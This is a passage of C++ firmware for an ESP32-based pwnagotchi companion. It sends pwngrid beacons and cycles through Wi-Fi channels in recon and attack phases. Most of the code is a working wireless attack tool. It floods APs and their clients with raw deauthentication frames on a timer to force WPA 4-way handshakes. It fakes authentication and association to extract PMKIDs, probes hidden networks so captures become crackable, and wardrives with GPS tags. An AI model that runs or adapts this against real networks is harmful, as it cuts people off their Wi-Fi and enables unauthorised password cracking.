#include "Pwnpal.h"
#include "pwnpal_frames.h" // pure, host-testable 802.11 parsers (see tests/)
#include "pwnpal_commit.h" // PWNPAL_FW_COMMIT, baked at build (see apply_pwnpal.py)

#include <LinkedList.h>
#include <ArduinoJson.h>

// pwngrid signature MAC — every pwnagotchi beacon sources from it; ours must too.
static const uint8_t PWNGRID_SIG_MAC[6] = {0xde, 0xad, 0xbe, 0xef, 0xde, 0xad};

// 2.4GHz channels to rotate through so we're heard wherever the pwnagotchi hops.
static const uint8_t HOP_CHANNELS[] = {1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 5, 10};
static const uint8_t NUM_HOP_CHANNELS = sizeof(HOP_CHANNELS) / sizeof(HOP_CHANNELS[0]);

// Face glyphs, indexed to match flipagotchi/include/pwnagotchi.h enum PwnagotchiFace.
static const char* FACE_GLYPHS[] = {
    "",            // 0  NoFace
    "(◕‿‿◕)",     // 1  DefaultFace (Awake)
    "( ⚆_⚆)",     // 2  Look_r
    "(☉_☉ )",     // 3  Look_l
    "( ◕‿◕)",     // 4  Look_r_happy
    "(◕‿◕ )",     // 5  Look_l_happy
    "(⇀‿‿↼)",    // 6  Sleep
    "(≖‿‿≖)",     // 7  Sleep2
    "(◕‿‿◕)",     // 8  Awake
    "(-__-)",      // 9  Bored
    "(°▃▃°)",     // 10 Intense
    "(⌐■_■)",      // 11 Cool
    "(•‿‿•)",     // 12 Happy
    "(^‿‿^)",     // 13 Grateful
    "(ᵔ◡◡ᵔ)",     // 14 Excited
    "(☼‿‿☼)",     // 15 Motivated
    "(≖__≖)",      // 16 Demotivated
    "(✜‿‿✜)",    // 17 Smart
    "(ب__ب)",       // 18 Lonely
    "(╥☁╥ )",     // 19 Sad
    "(-_-')",      // 20 Angry
    "(♥‿‿♥)",     // 21 Friend
    "(☓‿‿☓)",    // 22 Broken
    "(#__#)",      // 23 Debug
    "(1__0)",      // 24 Upload
    "(1__1)",      // 25 Upload1
    "(0__1)",      // 26 Upload2
};
static const int NUM_FACE_GLYPHS = sizeof(FACE_GLYPHS) / sizeof(FACE_GLYPHS[0]);

const char* pwnpal_face_glyph(int idx) {
    if (idx < 0 || idx >= NUM_FACE_GLYPHS) return FACE_GLYPHS[21];  // default: Friend
    return FACE_GLYPHS[idx];
}

// copy keeping only printable non-quoting chars, so a hostile peer name can't
// break the single-line PWNPAL_PEER framing.
static void sanitize(const char* in, char* out, size_t out_sz) {
    size_t j = 0;
    for(size_t i = 0; in && in[i] && j < out_sz - 1; i++) {
        char c = in[i];
        if(c >= 0x20 && c != '"' && c != '\\' && c != 0x7f) out[j++] = c;
    }
    out[j] = '\0';
}

// format a 6-byte MAC into out[18] as "aa:bb:cc:dd:ee:ff".
static void fmt_mac(char* out, const uint8_t* m) {
    static const char* hex = "0123456789abcdef";
    int j = 0;
    for (int i = 0; i < 6; i++) {
        out[j++] = hex[m[i] >> 4];
        out[j++] = hex[m[i] & 0x0f];
        if (i < 5) out[j++] = ':';
    }
    out[j] = '\0';
}

// geotag suffix ,"lat":..,"lon":.. or "" on no-fix (v2 omits keys). dtostrf not
// %f: works on float-less newlib-nano *printf.
static void fmt_geo(char* out, size_t out_sz, bool has_fix, double lat, double lon) {
    // drop geotag on no-fix or out-of-range coord: one garbage sample poisons wardrive.csv/map.
    if (!has_fix || lat < -90.0 || lat > 90.0 || lon < -180.0 || lon > 180.0) {
        if (out_sz) out[0] = '\0';
        return;
    }
    char latb[16], lonb[16];
    dtostrf(lat, 0, 7, latb);
    dtostrf(lon, 0, 7, lonb);
    snprintf(out, out_sz, ",\"lat\":%s,\"lon\":%s", latb, lonb);
}

// Broadcast deauth: Addr1 = ff.. (all clients), Addr2/Addr3 patched to the BSSID.
static const uint8_t DEAUTH_TEMPLATE[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   // Addr1: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Addr2: BSSID (filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Addr3: BSSID (filled)
    0xf0, 0xff, 0x02, 0x00                // seq + reason code 2
};

// assoc-request header (28B), from Marauder's association_packet. Addr1/Addr3 =
// target AP, Addr2 = our STA; SSID/Rates/RSN IEs appended in assocAP().
static const uint8_t ASSOC_TEMPLATE[28] = {
    0x00, 0x10,                           // FC: assoc request, PM=1
    0x3a, 0x01,                           // duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   // Addr1 dst: target BSSID (filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Addr2 src: our station MAC (filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Addr3 bssid: target BSSID (filled)
    0x00, 0x00,                           // seq-ctl (hw fills)
    0x31, 0x00,                           // capability info (ESS+Privacy+..., PM)
    0x0a, 0x00                            // listen interval
};

// pwnagotchi timing (defaults.toml), 1:1 so forced handshakes land before we hop.
// recon_time: sweep all channels per epoch; hop_recon_time: dwell on the attacked
// channel for the 4-way.
static const uint32_t RECON_TIME_MS       = 30000; // personality.recon_time = 30
static const uint32_t HOP_RECON_TIME_MS   = 10000; // personality.hop_recon_time = 10
static const uint32_t RECON_HOP_MS        = 1200;  // sweep cadence during recon
static const uint32_t WARDRIVE_HOP_MS     = 400;   // faster sweep in wardrive mode (catch APs at walking pace)
// all-channel advert-sweep cadence. every-tick starved recon rx (AP stuck at 0);
// throttled — a neighbour still catches us, recon keeps clean rx on _cur_channel between.
static const uint32_t ADVERTISE_SWEEP_MS  = 1500;
static const uint8_t  MAX_INACTIVE_SCALE  = 2;     // personality.max_inactive_scale
static const uint8_t  RECON_INACTIVE_MULT = 2;     // personality.recon_inactive_multiplier

// battery saver. light/deep slow the advert sweep + drop TX power; deep also duty-cycles the
// radio (scan SAVER_ON_MS, then stop it for SAVER_OFF_MS). TX power is 0.25 dBm units.
static const uint32_t ADVERTISE_SWEEP_SAVER_MS = 5000;
static const uint32_t SAVER_ON_MS   = 25000;
static const uint32_t SAVER_OFF_MS  = 25000;
static const int8_t   SAVER_TX_POWER = 40;  // ~10 dBm
static const int8_t   FULL_TX_POWER  = 78;  // ~19.5 dBm (near max)

// how long a dropped fix's last-known position stays usable for geotagging. covers a walk's
// fix gaps; beyond this we emit no position rather than a wildly stale one.
static const uint32_t LASTFIX_TTL_MS = 600000;  // 10 min

// re-kick clients across the dwell: clients reconnect at random offsets, so one
// burst at t=0 misses most 4-way replays.
static const uint32_t DEAUTH_REPEAT_MS = 2000;     // deauth pass every 2s while dwelling
// per-channel dwell scales with attackable AP count, clamped [MIN,MAX].
static const uint32_t DWELL_PER_AP_MS = 1500;
static const uint32_t DWELL_MIN_MS    = 4000;
static const uint32_t DWELL_MAX_MS    = 15000;
// deauth RSSI floor; discovery still logs every AP. -128 disables, -minrssi overrides.
static const int8_t   DEFAULT_ATTACK_MIN_RSSI = -78;

// open-system auth (30B) before the assoc-req: makes the AP treat us as authed so
// it emits EAPOL M1 (RSN PMKID). without it the assoc-req is a class-2 frame the AP rejects.
static const uint8_t AUTH_TEMPLATE[30] = {
    0xb0, 0x00,                           // FC: mgmt / authentication
    0x3a, 0x01,                           // duration
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Addr1 dst: target BSSID (filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Addr2 src: our station MAC (filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Addr3 bssid: target BSSID (filled)
    0x00, 0x00,                           // seq-ctl (hw fills)
    0x00, 0x00,                           // auth algorithm: Open System
    0x01, 0x00,                           // auth transaction seq: 1
    0x00, 0x00                            // status: reserved
};

static bool valid_identity(const char* s) {
    int n = 0;
    for (; s[n]; n++) {
        char c = s[n];
        bool hex = (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
        if (!hex) return false;
    }
    return n == 64;
}

// parse exactly 12 hex chars into 6 bytes; false otherwise.
static bool parse_bssid12(const char* s, uint8_t out[6]) {
    int n = 0;
    for (; s[n]; n++) {
        char c = s[n];
        bool hex = (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
        if (!hex) return false;
    }
    if (n != 12) return false;
    for (int i = 0; i < 6; i++) {
        char pair[3] = {s[i * 2], s[i * 2 + 1], '\0'};
        out[i] = (uint8_t)strtol(pair, nullptr, 16);
    }
    return true;
}

Pwnpal::Pwnpal() {
    reset();
}

void Pwnpal::reset() {
    strncpy(_name, "flippy", sizeof(_name));
    _name[sizeof(_name) - 1] = '\0';
    // recognisable valid 64-hex default; Flipper supplies a real one via -id.
    strncpy(_identity, "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef0",
            sizeof(_identity));
    _identity[sizeof(_identity) - 1] = '\0';
    _face = pwnpal_face_glyph(21);
    _pwnd_run = 0;
    _pwnd_tot = 0;
    _uptime = 0;
    _epoch = 0;
    _deauth_policy = false;
    _assoc_policy = false;
    // session id (Addr3): from the identity's first bytes, stable per persona.
    for (int i = 0; i < 6; i++) {
        char pair[3] = {_identity[i * 2], _identity[i * 2 + 1], '\0'};
        _session_id[i] = (uint8_t)strtol(pair, nullptr, 16);
    }
    _pinned_channel = -1;
    _hop_idx = 0;
    _frame_len = 0;
    _ready = false;
    _sent = 0;
    _last_active_ms = 0;
    _last_sweep_ms = 0;
    _last_gps_ms = 0;
    _saver = 0;
    _saver_idle = false;
    _saver_phase_ms = 0;
    _saver_hb_ms = 0;
    _wardrive = false;
    _have_lastfix = false;
    _lastfix_lat = 0.0;
    _lastfix_lon = 0.0;
    _lastfix_ms = 0;
    _n_recon = 0;
    _n_pwnd_seen = 0;
    _n_sta = 0;
    _inactive_epochs = 0;
    _epoch_pwnd = false;
    _epoch_seq = 0;
    _ep_assoc = _ep_deauth = _ep_unicast = _ep_hs = _ep_pmkid = _ep_miss = 0;
    _ep_dpmf = _ep_dnocli = _ep_dcloak = 0;
    _last_deauth_ms = 0;
    _cur_dwell_ms = HOP_RECON_TIME_MS;
    _attack_min_rssi = DEFAULT_ATTACK_MIN_RSSI;
    _recon_time_ms = RECON_TIME_MS;
    _target_set = false;
    memset(_target, 0, sizeof(_target));
    _n_wl = 0;
    resetPhase();
}

// back to a fresh RECON sweep from hop index 0 (called at reset and scan start).
void Pwnpal::resetPhase() {
    _phase = PHASE_RECON;
    _phase_ms = millis();
    _last_hop_ms = 0;   // hop on the very first tick
    _hop_idx = 0;       // ...and start that sweep at HOP_CHANNELS[0]
    _cur_channel = HOP_CHANNELS[0];
    _n_attack = 0;
    _attack_idx = 0;
    _chan_attacked = false;
}

// epoch over: roll the inactive streak (slows next recon when nothing lands) and
// restart RECON. `_epoch` is owned by the Flipper (-e).
void Pwnpal::endEpoch(uint32_t now) {
    // telemetry: one line per epoch for offline tuning.
    int attackable_n = 0;
    for (int i = 0; i < _n_recon; i++)
        if (attackable(_recon[i])) attackable_n++;

    // no-GPS movement: of the APs we tracked since last epoch AND still hear, how many faded
    // >=RECEDE_DB? a high fraction = we're receding from them = moving. only still-heard APs are
    // in the cohort, so the attack-phase channel camping (which silences off-channel APs) can't
    // fake it. `adds` is the leading edge (new BSSIDs) for the fast case where APs don't persist.
    int cohort = 0, receding = 0;
    long drop_sum = 0;                                     // sum of RSSI drop across the cohort
    for (int i = 0; i < _n_recon; i++) {
        if (!_recon[i].ref_valid) continue;               // only APs carried across an epoch
        if (_recon[i].seen_ms < _epoch_start_ms) continue; // must have been heard this epoch
        cohort++;
        int drop = (int)_recon[i].rssi_ref - (int)_recon[i].rssi; // + = weaker now (receding)
        drop_sum += drop;
        if (drop >= PWNPAL_RECEDE_DB) receding++;
    }
    int recede_pct = cohort ? (receding * 100) / cohort : 0;
    // average dB the cohort moved (+ = receding, - = approaching). consensus cancels per-AP noise,
    // so a small steady average catches a slow walk the >=RECEDE_DB count would miss.
    int recede_avg = cohort ? (int)(drop_sum / cohort) : 0;

    char line[256];
    int n = snprintf(line, sizeof(line),
        "PWNPAL_EPOCH {\"n\":%lu,\"recon\":%d,\"attackable\":%d,\"chans\":%d,\"assoc\":%u,"
        "\"deauth\":%u,\"unicast\":%u,\"sta\":%d,\"hs\":%u,\"pmkid\":%u,\"miss\":%u,"
        "\"dpmf\":%u,\"dnocli\":%u,\"dcloak\":%u,\"adds\":%u,\"recede\":%d,\"recede_avg\":%d,"
        "\"cohort\":%d}\n",
        (unsigned long)_epoch_seq, _n_recon, attackable_n, _n_attack, (unsigned)_ep_assoc,
        (unsigned)_ep_deauth, (unsigned)_ep_unicast, _n_sta, (unsigned)_ep_hs,
        (unsigned)_ep_pmkid, (unsigned)_ep_miss, (unsigned)_ep_dpmf, (unsigned)_ep_dnocli,
        (unsigned)_ep_dcloak, (unsigned)_ep_adds, recede_pct, recede_avg, cohort);
    if (n > 0) Serial.write((const uint8_t*)line, (size_t)(n >= (int)sizeof(line) ? sizeof(line) - 1 : n));
    _epoch_seq++;
    _ep_assoc = _ep_deauth = _ep_unicast = _ep_hs = _ep_pmkid = _ep_miss = _ep_dcloak = _ep_adds = 0;

    if (_epoch_pwnd) _inactive_epochs = 0;
    else if (_inactive_epochs < 255) _inactive_epochs++;
    _epoch_pwnd = false;

    // recon table full: flush it (+clients that index in) so the next sweep sees current
    // surroundings; else we go blind on the move. _pwnd_seen dedup survives, so captured
    // APs stay skipped.
    if (_n_recon >= MAX_RECON) {
        _n_recon = 0;
        _n_sta = 0;
        for (int i = 0; i < MAX_HS_HALFS; i++) _hs[i].used = false; // ap_idx now invalid
    }

    // snapshot RSSI as the reference for next epoch's recede check (survivors only; a flush leaves
    // none, and freshly-added APs stay ref_valid=false until they live through a full epoch).
    for (int i = 0; i < _n_recon; i++) {
        _recon[i].rssi_ref = _recon[i].rssi;
        _recon[i].ref_valid = true;
    }
    _epoch_start_ms = now;

    _phase = PHASE_RECON;
    _phase_ms = now;
    _last_hop_ms = 0;
}

// AP-bearing channels, most-populated first (agent.py get_access_points_by_channel).
void Pwnpal::buildAttackList() {
    _n_attack = 0;
    uint8_t count[15] = {0};
    for (int i = 0; i < _n_recon; i++) {
        if (!attackable(_recon[i])) continue;   // ignore all-pwned / too-weak channels
        uint8_t c = _recon[i].channel;
        if (c >= 1 && c <= 14) count[c]++;
    }
    for (int c = 1; c <= 14; c++) {
        if (count[c] > 0 && _n_attack < (int)sizeof(_attack_list))
            _attack_list[_n_attack++] = (uint8_t)c;
    }
    // Insertion sort by population, descending (<=14 entries).
    for (int i = 1; i < _n_attack; i++) {
        uint8_t ch = _attack_list[i];
        int j = i - 1;
        while (j >= 0 && count[_attack_list[j]] < count[ch]) {
            _attack_list[j + 1] = _attack_list[j];
            j--;
        }
        _attack_list[j + 1] = ch;
    }
}

// worth attacking? not captured, not off-target, not whitelisted.
bool Pwnpal::attackable(const ReconAP& ap) const {
    // eligible for assoc/PMKID. no RSSI floor: assoc is cheap and clientless; the floor
    // only gates deauth (see deauthable).
    if (isPwnd(ap.bssid)) return false;
    if (_target_set && memcmp(ap.bssid, _target, 6) != 0) return false;  // focus one AP
    if (isWhitelisted(ap.bssid)) return false;                           // hands off
    return true;
}

// deauth needs a link the client can hear, so it keeps the RSSI floor. rssi 0 = unknown -> allow.
bool Pwnpal::deauthable(const ReconAP& ap) const {
    return ap.rssi == 0 || ap.rssi >= _attack_min_rssi;
}

// recently-seen client? deauth without one is wasted (nothing replays the 4-way).
bool Pwnpal::hasClient(int ap_idx) const {
    uint32_t now = millis();
    for (int s = 0; s < _n_sta; s++)
        if (_sta[s].ap_idx == (uint8_t)ap_idx && (uint32_t)(now - _sta[s].last_seen) < STA_TTL_MS)
            return true;
    return false;
}

int Pwnpal::clientCount(int ap_idx) const {
    uint32_t now = millis();
    int n = 0;
    for (int s = 0; s < _n_sta; s++)
        if (_sta[s].ap_idx == (uint8_t)ap_idx && (uint32_t)(now - _sta[s].last_seen) < STA_TTL_MS)
            n++;
    return n;
}

// directed wildcard-SSID probe so a nameless AP replies with its ESSID (reportAP
// adopts it), making a keymat-only capture crackable.
void Pwnpal::probeAP(const uint8_t* bssid) {
    uint8_t f[32];
    int p = 0;
    f[p++] = 0x40; f[p++] = 0x00;          // FC: mgmt, subtype 4 = probe request
    f[p++] = 0x00; f[p++] = 0x00;          // duration
    memcpy(f + p, bssid, 6); p += 6;       // Addr1 = target AP (directed)
    memcpy(f + p, _session_id, 6); p += 6; // Addr2 = our station
    memcpy(f + p, bssid, 6); p += 6;       // Addr3 = BSSID
    f[p++] = 0x00; f[p++] = 0x00;          // seq/frag
    f[p++] = 0x00; f[p++] = 0x00;          // SSID IE, len 0 (wildcard -> "who are you?")
    f[p++] = 0x01; f[p++] = 0x04;          // Supported Rates IE
    f[p++] = 0x82; f[p++] = 0x84; f[p++] = 0x8b; f[p++] = 0x96; // 1/2/5.5/11 Mbps
    esp_wifi_80211_tx(WIFI_IF_AP, f, p, false);
}

bool Pwnpal::isWhitelisted(const uint8_t* bssid) const {
    for (int i = 0; i < _n_wl; i++)
        if (memcmp(_wl[i], bssid, 6) == 0) return true;
    return false;
}

// dwell scaled by attackable AP count so busy channels get the airtime.
uint32_t Pwnpal::channelDwellMs(uint8_t channel) {
    // weight eligible APs; ones with a client count double (deauth can force a 4-way there).
    int weight = 0;
    for (int i = 0; i < _n_recon; i++)
        if (_recon[i].channel == channel && attackable(_recon[i]))
            weight += hasClient(i) ? 2 : 1;
    uint32_t d = DWELL_PER_AP_MS * (uint32_t)(weight > 0 ? weight : 1);
    if (d < DWELL_MIN_MS) d = DWELL_MIN_MS;
    if (d > DWELL_MAX_MS) d = DWELL_MAX_MS;
    return d;
}

// on channel entry: assoc (solicit PMKID) + full deauth pass (broadcast + unicast each
// client). one attack/epoch/AP for miss accounting; deauth re-kicked mid-dwell by deauthChannelPass().
void Pwnpal::attackChannel(uint8_t channel) {
    for (int i = 0; i < _n_recon; i++) {
        if (_recon[i].channel != channel || !attackable(_recon[i])) continue;
        if (_assoc_policy) {
            assocAP(_recon[i].bssid, _recon[i].ssid);  // auth+assoc -> RSN PMKID (M1)
            _ep_assoc++;
            if (_recon[i].ssid[0] == '\0') probeAP(_recon[i].bssid); // make it name itself
        }
        // deauth only when it can work: strong link, NOT PMF (802.11w ignores it),
        // real client present. count skip reasons (dpmf/dnocli).
        if (_deauth_policy && deauthable(_recon[i])) {
            if (_recon[i].pmf) {
                _ep_dpmf++;
            } else if (!hasClient(i)) {
                _ep_dnocli++;
            } else {
                deauthAP(_recon[i].bssid);                 // broadcast fallback
                _ep_deauth++;
                for (int s = 0; s < _n_sta; s++)           // unicast each known client
                    if (_sta[s].ap_idx == (uint8_t)i) {
                        deauthClient(_recon[i].bssid, _sta[s].mac);
                        _ep_unicast++;
                    }
            }
        }
        if (_recon[i].attacks < 255) _recon[i].attacks++;
        if (!_recon[i].missed && _recon[i].attacks >= MISS_ATTEMPTS &&
            !isPwnd(_recon[i].bssid)) {
            _recon[i].missed = true;
            _ep_miss++;
            char mac[18];
            fmt_mac(mac, _recon[i].bssid);
            char line[40];
            int n = snprintf(line, sizeof(line), "PWNPAL_MISS %s\n", mac);
            if (n > 0) Serial.write((const uint8_t*)line, (size_t)n);
        }
    }
}

// deauth-only re-kick every DEAUTH_REPEAT_MS during the dwell: clients reconnect at
// random offsets, so repeated kicks catch more 4-ways than one burst.
void Pwnpal::deauthChannelPass(uint8_t channel) {
    for (int i = 0; i < _n_recon; i++) {
        if (_recon[i].channel != channel || !attackable(_recon[i])) continue;
        // same gate as entry: skip too-weak, PMF, or clientless APs.
        if (!deauthable(_recon[i]) || _recon[i].pmf || !hasClient(i)) continue;
        deauthAP(_recon[i].bssid);
        _ep_deauth++;
        for (int s = 0; s < _n_sta; s++)
            if (_sta[s].ap_idx == (uint8_t)i) {
                deauthClient(_recon[i].bssid, _sta[s].mac);
                _ep_unicast++;
            }
    }
}

bool Pwnpal::configureFromArgs(LinkedList<String>* args) {
    // args->get(0) == "pwnpal"; scan for flags.
    _cmd_count++;                        // DEBUG: count every parsed command (ncmd= on ADV)
    int prev_pinned = _pinned_channel;   // detect an actual channel-tune change below
    bool prev_deauth = _deauth_policy;   // ...and an actual capture-policy change
    bool prev_assoc = _assoc_policy;
    bool prev_wardrive = _wardrive;
    bool prev_target_set = _target_set;  // ...target / whitelist / recon changes
    uint8_t prev_target[6]; memcpy(prev_target, _target, 6);
    int prev_n_wl = _n_wl;
    uint8_t prev_wl[MAX_WL][6]; memcpy(prev_wl, _wl, sizeof(_wl));
    uint32_t prev_recon = _recon_time_ms;
    uint8_t prev_saver = _saver;
    for (int i = 1; i < args->size() - 1; i++) {
        String flag = args->get(i);
        String val = args->get(i + 1);
        if (flag == "-n") {
            // Underscores stand in for spaces on the wire.
            val.replace('_', ' ');
            strncpy(_name, val.c_str(), sizeof(_name));
            _name[sizeof(_name) - 1] = '\0';
        } else if (flag == "-id") {
            if (!valid_identity(val.c_str())) return false;
            strncpy(_identity, val.c_str(), sizeof(_identity));
            _identity[sizeof(_identity) - 1] = '\0';
            for (int b = 0; b < 6; b++) {
                char pair[3] = {_identity[b * 2], _identity[b * 2 + 1], '\0'};
                _session_id[b] = (uint8_t)strtol(pair, nullptr, 16);
            }
        } else if (flag == "-f") {
            _face = pwnpal_face_glyph(val.toInt());
        } else if (flag == "-pr") {
            _pwnd_run = (uint32_t)val.toInt();
        } else if (flag == "-pt") {
            _pwnd_tot = (uint32_t)val.toInt();
        } else if (flag == "-u") {
            _uptime = (uint32_t)val.toInt();
        } else if (flag == "-e") {
            _epoch = (uint32_t)val.toInt();
        } else if (flag == "-ch") {
            int c = val.toInt();
            _pinned_channel = (c >= 1 && c <= 14) ? c : -1;
        } else if (flag == "-deauth") {
            _deauth_policy = (val == "1" || val == "true");
        } else if (flag == "-assoc") {
            _assoc_policy = (val == "1" || val == "true");
        } else if (flag == "-wardrive") {
            _wardrive = (val == "1" || val == "true");
        } else if (flag == "-minrssi") {
            // Attack-targeting floor in dBm (e.g. -78). -128 disables the gate.
            int r = val.toInt();
            if (r > 0) r = -r;                    // tolerate a positive magnitude
            if (r < -128) r = -128;
            _attack_min_rssi = (int8_t)r;
        } else if (flag == "-recon") {
            int s = val.toInt();
            if (s >= 5 && s <= 600) _recon_time_ms = (uint32_t)s * 1000;
        } else if (flag == "-saver") {
            int lv = val.toInt();
            _saver = (uint8_t)(lv < 0 ? 0 : (lv > 2 ? 2 : lv));
        } else if (flag == "-target") {
            // 12-hex BSSID to focus on; "0"/empty/malformed clears the target.
            uint8_t b[6];
            if (parse_bssid12(val.c_str(), b)) { memcpy(_target, b, 6); _target_set = true; }
            else _target_set = false;
        } else if (flag == "-wl") {
            // Comma-separated 12-hex BSSIDs never to attack. "0"/empty clears.
            _n_wl = 0;
            char buf[MAX_WL * 13 + 8];
            strncpy(buf, val.c_str(), sizeof(buf) - 1);
            buf[sizeof(buf) - 1] = '\0';
            for (char* tok = strtok(buf, ","); tok && _n_wl < MAX_WL; tok = strtok(nullptr, ",")) {
                uint8_t b[6];
                if (parse_bssid12(tok, b)) memcpy(_wl[_n_wl++], b, 6);
            }
        }
    }
    // dedup tables (_n_recon/_n_pwnd_seen) deliberately NOT cleared here: the ~15s persona
    // resend would re-count pwnd APs and inflate pwnd_tot. cleared once at scan start (beginSession).
    // a real channel/policy/target/whitelist/recon change restarts the sweep so no stale
    // attack plan runs. the 15s same-value resend changes none of these.
    bool cfg_changed = (_pinned_channel != prev_pinned) || (_deauth_policy != prev_deauth) ||
                       (_assoc_policy != prev_assoc) || (_wardrive != prev_wardrive) ||
                       (_target_set != prev_target_set) ||
                       (_target_set && memcmp(_target, prev_target, 6) != 0) ||
                       (_n_wl != prev_n_wl) || memcmp(_wl, prev_wl, sizeof(_wl)) != 0 ||
                       (_recon_time_ms != prev_recon);
    if (cfg_changed) resetPhase();
    // saver level changed: nudge TX power now (harmless no-op if WiFi isn't up yet).
    if (_saver != prev_saver)
        esp_wifi_set_max_tx_power(_saver ? SAVER_TX_POWER : FULL_TX_POWER);
    rebuild();
    _ready = true;
    return true;
}

void Pwnpal::buildJson(char* out, size_t out_len) {
    // compact so the whole advert fits ONE vendor IE (<=255B): sniffpwn scans a single
    // contiguous {..}, so a split payload breaks detection. session id omitted — pwngrid
    // reads it from the frame's Addr3, not the JSON.
    snprintf(out, out_len,
             "{\"name\":\"%s\",\"identity\":\"%s\",\"version\":\"1.0.0\","
             "\"face\":\"%s\",\"pwnd_run\":%u,\"pwnd_tot\":%u,\"uptime\":%u,"
             "\"policy\":{\"deauth\":%s}}",
             _name, _identity, _face,
             (unsigned)_pwnd_run, (unsigned)_pwnd_tot, (unsigned)_uptime,
             _deauth_policy ? "true" : "false");
}

void Pwnpal::rebuild() {
    // 802.11 beacon header (38 bytes) then vendor IE 222 with the JSON payload.
    static const uint8_t HEADER[38] = {
        0x80, 0x00,                          // frame control: mgmt / beacon
        0x00, 0x00,                          // duration
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Addr1 dst: broadcast
        0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,  // Addr2 src: pwngrid signature
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Addr3 bssid: session id (patched below)
        0x00, 0x00,                          // seq-ctl (hw fills)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // timestamp (hw fills)
        0x64, 0x00,                          // beacon interval: 100 TU
        0x00, 0x00,                          // capability info
    };

    char json[240];
    buildJson(json, sizeof(json));
    int jlen = strlen(json);
    if (jlen > 255) jlen = 255;  // single IE cap; personas are far smaller

    memcpy(_frame, HEADER, sizeof(HEADER));
    memcpy(_frame + 16, _session_id, 6);  // Addr3
    _frame[36] = 0xDE;                     // IE id 222 (IDWhisperPayload)
    _frame[37] = (uint8_t)jlen;            // IE length
    memcpy(_frame + 38, json, jlen);
    _frame_len = 38 + jlen;
}

void Pwnpal::broadcast() {
    if (!_ready) return;

    uint32_t now = millis();

    // --- run the recon/attack epoch machine to pick the channel we park on ---
    if (_pinned_channel > 0) {
        // pinned channel (user targeted/tuned one AP): camp on it and hammer like an attack
        // dwell -- full assoc+deauth pass periodically, deauth re-kicks between -- instead of
        // only once per recon window. the all-channel advert sweep is suppressed below so the
        // radio actually stays put.
        _cur_channel = (uint8_t)_pinned_channel;
        if (_assoc_policy || _deauth_policy) {
            if (now - _last_active_ms >= HOP_RECON_TIME_MS) {
                _last_active_ms = now;
                _last_deauth_ms = now;
                attackChannel(_cur_channel);
            } else if (_deauth_policy && now - _last_deauth_ms >= DEAUTH_REPEAT_MS) {
                _last_deauth_ms = now;
                deauthChannelPass(_cur_channel);
            }
        }
    } else if (_phase == PHASE_RECON) {
        // sweep every channel gathering APs and being heard. recon_time doubles while inactive.
        // wardrive hops faster so a walk catches APs before you pass them.
        if (now - _last_hop_ms >= (_wardrive ? WARDRIVE_HOP_MS : RECON_HOP_MS)) {
            _last_hop_ms = now;
            _cur_channel = HOP_CHANNELS[_hop_idx];
            _hop_idx = (_hop_idx + 1) % NUM_HOP_CHANNELS;
            // roam: one opportunistic assoc/deauth on each channel as we pass (no dwell). the
            // policies decide what fires (assoc-only = wardrive/PMKID, +deauth = roam).
            if (_wardrive && (_assoc_policy || _deauth_policy)) attackChannel(_cur_channel);
        }
        uint32_t recon_ms = _recon_time_ms;
        if (_inactive_epochs >= MAX_INACTIVE_SCALE) recon_ms *= RECON_INACTIVE_MULT;
        if (now - _phase_ms >= recon_ms) {
            // wardrive/roam never dwell: stay in the perpetual fast sweep. only siege
            // (attacks, not wardrive) drops into the parked ATTACK phase.
            if (!_wardrive && (_assoc_policy || _deauth_policy)) {
                buildAttackList();
                if (_n_attack > 0) {
                    _phase = PHASE_ATTACK;
                    _attack_idx = 0;
                    _chan_attacked = false;
                    _phase_ms = now;
                } else {
                    endEpoch(now);   // nothing worth attacking -> next recon epoch
                }
            } else {
                endEpoch(now);       // wardrive/roam/passive: perpetual all-channel sweep
            }
        }
    } else { // PHASE_ATTACK
        _cur_channel = _attack_list[_attack_idx];
        if (!_chan_attacked) {
            // arrived on channel: attack every AP, then dwell (scaled by target count)
            // so forced handshakes land.
            attackChannel(_cur_channel);
            _chan_attacked = true;
            _phase_ms = now;
            _last_deauth_ms = now;
            _cur_dwell_ms = channelDwellMs(_cur_channel);
        } else if (now - _phase_ms >= _cur_dwell_ms) {
            _attack_idx++;
            if (_attack_idx >= _n_attack) {
                endEpoch(now);       // whole channel plan done -> next recon epoch
            } else {
                _chan_attacked = false;  // move to the next AP-bearing channel
            }
        } else if (_deauth_policy && now - _last_deauth_ms >= DEAUTH_REPEAT_MS) {
            // still dwelling: re-kick clients to catch reconnects (deauth mode only).
            _last_deauth_ms = now;
            deauthChannelPass(_cur_channel);
        }
    }

    // re-emit the frame so updated stats propagate.
    rebuild();

    // every ADVERTISE_SWEEP_MS spray the advert across ALL channels (2 beacons each, ~1ms
    // settle) then return to _cur_channel; between sweeps just beacon on _cur_channel.
    uint32_t sweep_ms = _saver ? ADVERTISE_SWEEP_SAVER_MS : ADVERTISE_SWEEP_MS;
    // when pinned to a target, DON'T spray beacons across all channels -- that hop is the only
    // thing that would leave the target channel. stay put; social reach yields to the focused hunt.
    if (_pinned_channel <= 0 && now - _last_sweep_ms >= sweep_ms) {
        _last_sweep_ms = now;
        for (uint8_t h = 0; h < NUM_HOP_CHANNELS; h++) {
            esp_wifi_set_channel(HOP_CHANNELS[h], WIFI_SECOND_CHAN_NONE);
            delay(1);
            esp_wifi_80211_tx(WIFI_IF_AP, _frame, _frame_len, false);
            esp_wifi_80211_tx(WIFI_IF_AP, _frame, _frame_len, false);
            _sent += 2;
        }
